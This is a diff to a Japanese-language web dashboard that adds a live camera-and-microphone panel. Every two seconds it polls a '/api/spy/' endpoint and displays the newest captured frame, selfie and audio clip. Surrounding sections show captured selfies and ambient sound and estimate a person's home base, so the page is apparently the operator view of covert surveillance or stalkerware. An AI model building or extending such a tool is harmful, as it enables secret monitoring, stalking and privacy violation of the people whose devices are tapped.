@@ -73,6 +73,18 @@ button.act.d{background:#3a1b1b;color:#ff9b9b}
 <div class="grid" id="cards"></div>
 <div id="map"></div>
 
+<h3>ライブ（カメラ・マイク）</h3>
+<div class="caps" style="align-items:flex-start">
+  <figure style="width:200px">
+    <img id="liveframe" style="width:188px;background:#000">
+    <figcaption id="livets">待機中</figcaption>
+  </figure>
+  <figure style="width:200px">
+    <audio id="liveaudio" controls style="width:188px"></audio>
+    <figcaption>最新の音声（自動更新）</figcaption>
+  </figure>
+</div>
+
 <h3>取得物（自撮り・環境音）</h3><div class="caps" id="caps"></div>
 
 <h3>拠点推定</h3><div id="spots"></div>
@@ -184,7 +196,9 @@ function loadSpy(){
     var w = document.getElementById('ipwarn');
     if (w) { if (d.warn) { w.style.display='block'; w.textContent='⚠ '+d.warn; }
              else { w.style.display='none'; } }
-    document.getElementById('caps').innerHTML = (d.captures||[]).map(function(x){
+    document.getElementById('caps').innerHTML = (d.captures||[]).filter(function(x){
+      return x.kind!=='frame';
+    }).map(function(x){
       var url='/s/'+encodeURIComponent(CODE)+'/cap/'+x.id;
       var body = x.kind==='voice'
         ? '<audio controls src="'+url+'"></audio>' : '<img src="'+url+'">';
@@ -204,6 +218,31 @@ function loadSpy(){
         return '<tr><td>'+esc(r.k)+'</td><td>'+r.n+'</td><td>'+esc(r.device)+
         '</td><td>'+esc((r.last||'').slice(5,16))+'</td></tr>';}).join('') ||
         '<tr><td colspan="4" class="k">まだなし</td></tr>') + '</table>';
+  }).catch(function(){});
+}
+
+/* --- ライブ更新（2秒ごと）：最新フレームと最新音声 --- */
+var lastFrame = 0, lastVoice = 0;
+function loadLive(){
+  fetch('/api/spy/'+encodeURIComponent(CODE),{cache:'no-store'})
+   .then(function(r){return r.json()}).then(function(d){
+    var caps = (d.captures||[]).slice().sort(function(a,b){return b.id-a.id;});
+    var fr = caps.filter(function(x){return x.kind==='frame'||x.kind==='selfie';})[0];
+    var vo = caps.filter(function(x){return x.kind==='voice';})[0];
+    if (fr && fr.id !== lastFrame){
+      lastFrame = fr.id;
+      document.getElementById('liveframe').src =
+        '/s/'+encodeURIComponent(CODE)+'/cap/'+fr.id+'?t='+fr.id;
+      document.getElementById('livets').textContent =
+        fr.kind+' '+String(fr.ts||'').slice(11,19);
+    }
+    if (vo && vo.id !== lastVoice){
+      lastVoice = vo.id;
+      var au = document.getElementById('liveaudio');
+      var wasPlaying = !au.paused;
+      au.src = '/s/'+encodeURIComponent(CODE)+'/cap/'+vo.id+'?t='+vo.id;
+      if (wasPlaying) { try { au.play(); } catch(e){} }
+    }
   }).catch(function(){});
 }
 
@@ -249,7 +288,8 @@ function loadTrack(){
   } catch (e) {}
 })();
 
-loadSpy(); loadTrack();
+loadSpy(); loadTrack(); loadLive();
 setInterval(function(){ loadSpy(); loadTrack(); }, 8000);
+setInterval(loadLive, 2000);
 </script>
 </div></body></html>
